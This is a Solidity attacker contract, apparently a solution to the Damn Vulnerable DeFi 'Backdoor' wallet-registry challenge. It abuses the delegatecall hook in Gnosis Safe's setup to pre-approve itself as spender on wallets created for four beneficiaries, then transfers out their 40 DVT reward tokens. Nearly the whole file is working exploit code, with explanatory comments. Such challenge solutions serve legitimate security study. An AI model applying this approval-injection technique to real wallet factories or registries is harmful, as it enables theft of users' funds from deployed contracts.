// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract WalletRegistryAttacker {
    // I made all of these immutable, but really only the token needs to be
    // immutable so the delegateApprove() function works as intended.
    address public immutable masterCopy;
    GnosisSafeProxyFactory immutable walletFactory;
    IERC20 public immutable token;
    WalletRegistry immutable walletRegistry;
    address[4] users;

    constructor(
        address _walletRegistry,
        address _walletFactory,
        address _token,
        address _masterCopy,
        address[] memory _users
    ) {
        walletRegistry = WalletRegistry(_walletRegistry);
        walletFactory = GnosisSafeProxyFactory(_walletFactory);
        token = IERC20(_token);
        masterCopy = _masterCopy;

        require(_users.length == 4, "There must be 4 users passed in");
        for (uint256 i = 0; i < _users.length; i++) {
            users[i] = _users[i];
        }
    }

    // The vulnerability here is that we can create a wallet using the
    // `GnosisSafeProxyFactory::createProxyWithCallback()` function, and then
    // pass this very contract as the `to` address in the `GnosisSafe::setup()`
    // function that we're required to call (see `WalletRegistry::proxyCreated`).
    //
    // The idea is that we create a wallet for each of the beneficiaries, and
    // trigger the `WalletRegistry::proxyCreated()` function for each of them,
    // which will transfer 10 DVT to each wallet. If we set the `to` address
    // as this contract, and call
    //
    // A delegatecall is made to the aforementioned `to` address, and we can
    // control the calldata for this delegatecall. Since msg.sender in this
    // context will be the wallet, we can pre-approve the transfer of 10 DVT
    // tokens to ourselves. We can't transfer them yet because we still have
    // to wait for `WalletRegistry::proxyCreated()` to run before the wallet
    // will contain tokens.
    function exploit() public {
        for (uint i = 0; i < users.length; i++) {
            // Setup the arguments for `GnosisSafe::setup()`
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            address wallet = address(
                walletFactory.createProxyWithCallback(
                    masterCopy,
                    abi.encodeWithSelector(
                        GnosisSafe.setup.selector,
                        owners, // owners
                        1, // threshold
                        address(this), // to
                        abi.encodeWithSelector(
                            this.delegateApprove.selector,
                            address(this)
                        ), // data
                        address(0), // fallbackHandler
                        address(0), // paymentToken
                        0, // payment
                        address(0) // paymentReceiver
                    ),
                    i,
                    walletRegistry
                )
            );

            // Now, the wallet above should have 10 DVT tokens, and we are an
            // approved spender of those tokens. Just transfer them to this
            // contract
            token.transferFrom(wallet, address(this), 10 ether);
        }

        // Transfer the stolen tokens to the attacker
        token.transfer(msg.sender, 40 ether);
    }

    // NOTE: You can't use `address(this)` in this function, as during a
    //       delegatecall, the `address(this)` is the address of the original
    //       calling contract. This is why we need the `spender` parameter
    function delegateApprove(address spender) public {
        token.approve(spender, 1000000 ether);
    }
}
